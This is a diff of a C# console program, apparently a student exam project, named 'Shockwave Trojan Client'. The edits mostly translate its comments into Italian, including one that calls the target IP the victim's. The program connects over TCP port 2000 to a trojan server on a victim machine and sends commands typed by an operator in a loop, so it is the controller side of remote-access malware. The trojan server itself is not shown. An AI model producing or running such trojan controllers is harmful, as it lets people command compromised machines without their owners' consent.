@@ -12,94 +12,86 @@ namespace esame
         public static bool IsConnected;
         public static NetworkStream Writer;
 
-        public static void SendCommand(string Command)
+        public static void SendCommand(string Command)//questo metodo prova a mandare i comandi
         {
-            //Try to send
-
             try
             {
-                //Creates a packet to hold the command
+                //array dove metto il comando
                 byte[] Packet = Encoding.ASCII.GetBytes(Command);
 
-                //Send the command over the network
+                //mando il comando
                 Writer.Write(Packet, 0, Packet.Length);
 
-                //Flush out any extra data that didn't send in the start.
                 Writer.Flush();
 
             }
 
             catch
             {
-                //Couldn't send, so we aren't connected anymore!
+                //non siamo più connessi
                 IsConnected = false;
 
                 Console.WriteLine("Disconnected from server!");
 
                 Console.ReadKey();
 
-                //Close the connection.
+                //chiudo la connessione
                 Writer.Close();
 
             }
         }
         static void Main(string[] args)
         {
-            //This just makes the program look cooler;-)
+        
             Console.ForegroundColor = ConsoleColor.Green;
-
             Console.Title = "Shockwave Trojan Client - Offline";
 
-            //This is the TcpClient; we will use this for the connection.
+            //è TcpClient, si usa per la connessione
             TcpClient Connector = new TcpClient();
 
-        //If you can't connect, it takes you back here to try again.
+        //etichetta su cui in fondo si fa il salto
         GetConnection:
 
-            //Get the user to enter the IP of the server.
+            //passo come parametro l'ip della vittima datomi dal server in python
             Console.WriteLine("Enter server IP :");
             string IP = Console.ReadLine();
 
-            //Attempt to connect; use a try...catch statement to avoid crashes.
+            //provo a connettermi
             try
             {
-                //Connect to the specified IP on port 2000 (the port the trojan server uses!)
+                //mi connetto all'IP e alla porta 2000
                 Connector.Connect(IP, 2000);
 
-                //So the program continues to receive commands.
                 IsConnected = true;
 
-                //Changes the console title to "Shockwave Trojan Client - Online"
-                Console.Title = "Shockwave Trojan Client - Online";
-
-                //Make Writer the stream coming from / going to Connector.
+               //serve per scrivere
                 Writer = Connector.GetStream();
 
-                //We connected!
+                //se arrivo qui mi sono connesso
             }
 
             catch
             {
-                //We couldn't connect :-(
+                //connessione fallita
                 Console.WriteLine("Error connecting to target server! Press any key to try again.");
                 Console.ReadKey();
 
-                //Go back and start again!
+                //riprovo a connettermi
                 Console.Clear();
                 goto GetConnection;
             }
 
-            //Let user know they connected and that if they type HELP they'll get a list of commands to use.
-            Console.WriteLine("Connection successfully established to " + IP + ".");
+           
+            Console.WriteLine("Connessione stabilita a " + IP + ".");
             Console.WriteLine("Type HELP for a list of commands.");
 
-            //While you're connected to the server
+            //sono connesso al server
             while (IsConnected)
             {
-                Console.WriteLine("Enter command : ");
+                Console.WriteLine("Scrivi comando : ");
                 string CMD = Console.ReadLine();
 
-                //If they type HELP
+                //comando help
                 if (CMD == "HELP")
                 {
                     Console.WriteLine("COMMANDS");
@@ -107,11 +99,11 @@ namespace esame
                     Console.WriteLine("MESSAGE!!!---message here");
                 }
 
-                //They entered a real command, so lets send it!
+                //mando il comando
                 else
 
                 {
-                    //Send the command using our function above
+                    //metodo per mandare il comando
                     SendCommand(CMD);
                 }
 
